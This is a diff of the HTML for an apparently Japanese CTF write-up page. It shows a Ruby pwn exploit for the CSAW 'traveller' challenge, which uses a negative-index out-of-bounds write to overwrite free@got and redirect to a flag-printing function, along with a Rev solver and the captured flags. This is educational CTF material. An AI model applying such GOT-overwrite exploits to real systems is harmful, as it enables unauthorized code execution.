@@ -182,76 +182,67 @@ z<span style="color:#666">.</span>interact</code></pre></div></li>
 <li>解けなかったのでwriteupを見た</li>
 <li>Off-by-oneがあるためHeap問題かと思ったら操作対象のインデックスの入力に負数が入力できるOOB問題</li>
 
-<li><p>編集コマンドで、<code>-50</code> をするとfree@gotを書き換えられたのでこれを使って<code>cat_flag</code>関数に飛ばす
-```ruby
-#!/usr/bin/env ruby</p>
+<li><p>編集コマンドで、<code>-50</code> をするとfree@gotを書き換えられたのでこれを使って<code>cat_flag</code>関数に飛ばす</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
+<span style="color:#408080;font-style:italic"># coding: ascii-8bit</span>
+<span style="color:#008000">require</span> <span style="color:#ba2121">&#39;pwn&#39;</span>
+$z <span style="color:#666">=</span> <span style="color:#800">Sock</span><span style="color:#666">.</span>new <span style="color:#ba2121">&#34;pwn.chal.csaw.io&#34;</span>, <span style="color:#666">1003</span>
+<span style="color:#408080;font-style:italic">#elf = ELF.new &#34;./traveller&#34;</span>
+<span style="color:#408080;font-style:italic">#libc = ELF.new &#34;./libc-2.23.so&#34;</span>
+context<span style="color:#666">.</span>log_level <span style="color:#666">=</span> <span style="color:#19177c">:debug</span>
+<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">z</span>; $z; <span style="color:#008000;font-weight:bold">end</span>
+<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">add</span>(dist, dest)
+z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;1&#34;</span>
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;&gt; &#34;</span>
+z<span style="color:#666">.</span>sendline dist<span style="color:#666">.</span>to_s
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
+z<span style="color:#666">.</span>sendline dest
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;&gt; &#34;</span>
+<span style="color:#008000;font-weight:bold">end</span>
+<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">change</span>(dist, dest)
+z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;2&#34;</span>
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
+z<span style="color:#666">.</span>sendline dist<span style="color:#666">.</span>to_s
+z<span style="color:#666">.</span>send dest
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;&gt; &#34;</span>
+<span style="color:#008000;font-weight:bold">end</span>
+<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">delete</span>(dist)
+z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;3&#34;</span>
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;: &#34;</span>
+z<span style="color:#666">.</span>sendline dist<span style="color:#666">.</span>to_s
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;&gt; &#34;</span>
+<span style="color:#008000;font-weight:bold">end</span>
+<span style="color:#008000;font-weight:bold">def</span> <span style="color:#00f">check</span>(dist)
+z<span style="color:#666">.</span>sendline <span style="color:#ba2121">&#34;4&#34;</span>
+z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;&gt;&#34;</span>
+z<span style="color:#666">.</span>sendline dist<span style="color:#666">.</span>to_s
+<span style="color:#008000;font-weight:bold">return</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;&gt; &#34;</span>
+<span style="color:#008000;font-weight:bold">end</span>
+tmp <span style="color:#666">=</span> z<span style="color:#666">.</span>recvuntil <span style="color:#ba2121">&#34;&gt; &#34;</span>
+stack_address <span style="color:#666">=</span> tmp<span style="color:#666">.</span>match(<span style="color:#b68">/.\n(.*) \n\n/</span>)<span style="color:#666">[</span><span style="color:#666">1</span><span style="color:#666">].</span>to_i(<span style="color:#666">16</span>)
+add(<span style="color:#666">1</span>, <span style="color:#ba2121">&#34;AAAAAAAA&#34;</span>)
+change(<span style="color:#666">-</span><span style="color:#666">50</span>, p64(<span style="color:#666">0x4008b6</span>))
+<span style="color:#008000">puts</span> delete(<span style="color:#666">0</span>)</code></pre></div></li>
 
-<h1 id="coding-ascii-8bit">coding: ascii-8bit</h1>
-
-<p>require &lsquo;pwn&rsquo;</p></li>
+<li><p><strong>flag{h0pe_y0u_3nj0y_ur_j0urn3y}</strong></p></li>
 </ul>
 
-<p>$z = Sock.new &ldquo;pwn.chal.csaw.io&rdquo;, 1003
-#elf = ELF.new &ldquo;./traveller&rdquo;
-#libc = ELF.new &ldquo;./libc-2.23.so&rdquo;</p>
+<h2 id="rev">Rev</h2>
 
-<p>context.log_level = :debug
-def z; $z; end</p>
+<h3 id="beleaf">Beleaf</h3>
 
-<p>def add(dist, dest)
-  z.sendline &ldquo;1&rdquo;
-  z.recvuntil &ldquo;&gt; &ldquo;
-  z.sendline dist.to_s
-  z.recvuntil &ldquo;: &ldquo;
-  z.sendline dest
-  z.recvuntil &ldquo;&gt; &ldquo;
-end</p>
+<ul>
+<li>バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する</li>
+</ul>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-ruby" data-lang="ruby"><span style="color:#408080;font-style:italic">#!/usr/bin/env ruby</span>
 
-<p>def change(dist, dest)
-  z.sendline &ldquo;2&rdquo;
-  z.recvuntil &ldquo;: &ldquo;
-  z.sendline dist.to_s
-  z.send dest
-  z.recvuntil &ldquo;&gt; &ldquo;
-end</p>
+idxs <span style="color:#666">=</span> <span style="color:#666">[</span><span style="color:#666">0x1</span>, <span style="color:#666">0x9</span>, <span style="color:#666">0x11</span>, <span style="color:#666">0x27</span>, <span style="color:#666">0x02</span>, <span style="color:#666">0x00</span>, <span style="color:#666">0x12</span>, <span style="color:#666">0x03</span>, <span style="color:#666">0x8</span>, <span style="color:#666">0x12</span>, <span style="color:#666">0x9</span>, <span style="color:#666">0x12</span>, <span style="color:#666">0x11</span>, <span style="color:#666">0x1</span>, <span style="color:#666">0x3</span>, <span style="color:#666">0x13</span>, <span style="color:#666">0x4</span>, <span style="color:#666">0x3</span>, <span style="color:#666">0x5</span>, <span style="color:#666">0x15</span>, <span style="color:#666">0x2e</span>, <span style="color:#666">0xa</span>, <span style="color:#666">0x3</span>, <span style="color:#666">0xa</span>, <span style="color:#666">0x12</span>, <span style="color:#666">0x3</span>, <span style="color:#666">0x1</span>, <span style="color:#666">0x2e</span>, <span style="color:#666">0x16</span>, <span style="color:#666">0x2e</span>, <span style="color:#666">0xa</span>, <span style="color:#666">0x12</span>, <span style="color:#666">0x6</span><span style="color:#666">]</span>
 
-<p>def delete(dist)
-  z.sendline &ldquo;3&rdquo;
-  z.recvuntil &ldquo;: &ldquo;
-  z.sendline dist.to_s
-  z.recvuntil &ldquo;&gt; &ldquo;
-end</p>
+flag <span style="color:#666">=</span> <span style="color:#666">[</span><span style="color:#666">0x77</span>, <span style="color:#666">0x66</span>, <span style="color:#666">0x7b</span>, <span style="color:#666">0x5f</span>, <span style="color:#666">0x6e</span>, <span style="color:#666">0x79</span>, <span style="color:#666">0x7d</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x62</span>, <span style="color:#666">0x6c</span>, <span style="color:#666">0x72</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x61</span>, <span style="color:#666">0x65</span>, <span style="color:#666">0x69</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x6f</span>, <span style="color:#666">0x74</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x67</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x20</span>, <span style="color:#666">0x75</span><span style="color:#666">].</span>map(<span style="color:#666">&amp;</span><span style="color:#19177c">:chr</span>)
 
-<p>def check(dist)
-  z.sendline &ldquo;4&rdquo;
-  z.recvuntil &ldquo;&gt;&rdquo;
-  z.sendline dist.to_s
-  return z.recvuntil &ldquo;&gt; &ldquo;
-end</p>
-
-<p>tmp = z.recvuntil &ldquo;&gt; &ldquo;
-stack_address = tmp.match(/.\n(.*) \n\n/)[1].to_i(16)</p>
-
-<p>add(1, &ldquo;AAAAAAAA&rdquo;)
-change(-50, p64(0x4008b6))
-puts delete(0)</p>
-<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">- **flag{h0pe_y0u_3nj0y_ur_j0urn3y}**
-
-## Rev
-
-### Beleaf
-
-- バイナリ中にFLAGに使われる文字列とインデックスの配列があるので、それを引っこ抜いてきて実行する
-```ruby
-#!/usr/bin/env ruby
-
-idxs = [0x1, 0x9, 0x11, 0x27, 0x02, 0x00, 0x12, 0x03, 0x8, 0x12, 0x9, 0x12, 0x11, 0x1, 0x3, 0x13, 0x4, 0x3, 0x5, 0x15, 0x2e, 0xa, 0x3, 0xa, 0x12, 0x3, 0x1, 0x2e, 0x16, 0x2e, 0xa, 0x12, 0x6]
-
-flag = [0x77, 0x66, 0x7b, 0x5f, 0x6e, 0x79, 0x7d, 0x20, 0x62, 0x6c, 0x72, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x61, 0x65, 0x69, 0x20, 0x6f, 0x74, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x67, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x75].map(&amp;:chr)
-
-idxs.each do |i|
-  print flag[i]
-end</pre></div>
+idxs<span style="color:#666">.</span>each <span style="color:#008000;font-weight:bold">do</span> <span style="color:#666">|</span>i<span style="color:#666">|</span>
+  <span style="color:#008000">print</span> flag<span style="color:#666">[</span>i<span style="color:#666">]</span>
+<span style="color:#008000;font-weight:bold">end</span></code></pre></div>
 <ul>
 <li><strong>flag{we_beleaf_in_your_re_future}</strong></li>
 </ul>
